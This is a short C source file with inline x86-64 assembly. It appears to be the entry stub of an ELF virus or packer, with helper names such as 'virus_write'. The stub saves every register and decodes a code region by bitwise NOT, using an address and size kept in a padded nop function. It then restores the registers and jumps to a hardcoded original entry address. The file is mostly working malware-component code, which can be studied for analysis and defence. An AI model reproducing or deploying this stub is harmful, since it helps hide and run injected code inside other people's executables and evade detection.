void end();
long virus_write();
char * virus_itoa();
void _start()
{
	__asm__ volatile(
			"push %rsp\n"
			"push %rax\n"
			"push %rcx\n"
			"push %rdx\n"
			"push %rbx\n"
			"push %rbp\n"
			"push %rsi\n"
			"push %rdi\n"
			"push %r8\n"
			"push %r9\n"
			"push %r10\n"
			"push %r11\n"
			"push %r12\n"
			"push %r13\n"
			"push %r14\n"
			"push %r15\n"
			"pushfq\n");

	char rr[20];
	unsigned long* addr = (unsigned long*)&end;
	unsigned long* con = (unsigned long*)*addr;
	unsigned long* size = (unsigned long*)&end+1;
	unsigned long i;
	for(i=0;i<*size;i++){
		*con = ~(*con);
		con++;
	}
	__asm__ volatile(
			"popfq\n"
			"pop %r15\n"
			"pop %r14\n"
			"pop %r13\n"
			"pop %r12\n"
			"pop %r11\n"
			"pop %r10\n"
			"pop %r9\n"
			"pop %r8\n"
			"pop %rdi\n"
			"pop %rsi\n"
			"pop %rbp\n"
			"pop %rbx\n"
			"pop %rdx\n"
			"pop %rcx\n"
			"pop %rax\n"
			"pop %rsp\n");
	__asm__ volatile("jmp 0x10000001");
}
//依次存放text段地址和代码段大小
void end(){
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
	__asm__ volatile("nop");
}
